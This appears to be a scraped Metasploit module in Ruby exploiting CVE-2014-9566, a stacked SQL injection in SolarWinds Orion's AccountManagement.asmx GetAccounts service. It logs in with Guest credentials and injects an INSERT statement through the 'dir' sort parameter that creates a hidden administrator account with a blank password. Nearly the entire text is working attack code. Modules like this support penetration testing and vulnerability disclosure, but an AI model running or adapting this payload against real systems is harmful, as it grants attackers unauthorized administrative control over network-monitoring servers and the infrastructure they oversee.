# This module requires Metasploit: http//:metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Solarwinds Orion AccountManagement.asmx GetAccounts Admin Creation&#039;,
&#039;Description&#039; => %q{
This module exploits a stacked SQL injection in order to add an administrator user to the
SolarWinds Orion database.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;Brandon Perry&#039; #discovery/metasploit module
],
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2014-9566&#039;]
],
&#039;DisclosureDate&#039; => &#039;Feb 24 2015&#039;
))
register_options(
[
Opt::RPORT(8787),
OptString.new(&#039;TARGETURI&#039;, [ true, "Base Orion directory path", &#039;/&#039;]),
OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate as&#039;, &#039;Guest&#039;]),
OptString.new(&#039;PASSWORD&#039;, [false, &#039;The password to authenticate with&#039;, &#039;&#039;])
], self.class)
end
def login (username,password)
res = send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, &#039;Orion&#039;, &#039;Login.aspx&#039;)
})
viewstate = $1 if res.body =~ /id="__VIEWSTATE" value="(.*)" \/>/
cookie = res.get_cookies
res = send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, &#039;Orion&#039;, &#039;Login.aspx&#039;),
&#039;method&#039; => &#039;POST&#039;,
&#039;vars_post&#039; => {
&#039;__EVENTTARGET&#039; => &#039;&#039;,
&#039;__EVENTARGUMENT&#039; => &#039;&#039;,
&#039;__VIEWSTATE&#039; => viewstate,
&#039;ctl00$BodyContent$Username&#039; => username,
&#039;ctl00$BodyContent$Password&#039; => password
},
&#039;cookie&#039; => cookie
})
if res.nil?
fail_with("Server didn&#039;t respond in an expected way")
end
if res.code == 200
fail_with("Authentication failed with username #{username}")
end
return cookie + &#039;;&#039; + res.get_cookies
end
def run
cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
username = Rex::Text.rand_text_alpha(8)
print_status("Logged in as #{datastore[&#039;USERNAME&#039;]}, sending payload to create #{username} admin user.")
send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, &#039;Orion&#039;, &#039;Services&#039;, &#039;AccountManagement.asmx&#039; &#039;/GetAccounts&#039;),
&#039;method&#039; => &#039;POST&#039;,
&#039;vars_get&#039; => {
&#039;sort&#039; => &#039;Accounts.AccountID&#039;, #also vulnerable
&#039;dir&#039; => "ASC;insert into accounts values (&#039;#{username}&#039;, &#039;127-510823478-74417-8&#039;, &#039;/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==&#039;, &#039;Feb 1 2100 12:00AM&#039;, &#039;Y&#039;, &#039;#{username}&#039;, 1, &#039;&#039;, &#039;&#039;, 1, -1, 8, -1, 4, 0, 0, 0, 0, 0, 0, &#039;Y&#039;, &#039;Y&#039;, &#039;Y&#039;, &#039;Y&#039;, &#039;Y&#039;, &#039;&#039;, &#039;&#039;, 0, 0, 0, &#039;N&#039;, &#039;Y&#039;, &#039;&#039;, 1, &#039;&#039;, 0, &#039;&#039;);"
},
&#039;data&#039; => &#039;{"accountId":""}&#039;,
&#039;cookie&#039; => cookie,
&#039;ctype&#039; => &#039;application/json&#039;
})
login(username, &#039;&#039;)
print_good("The injection worked, log in with #{username} and a blank password")
end
end


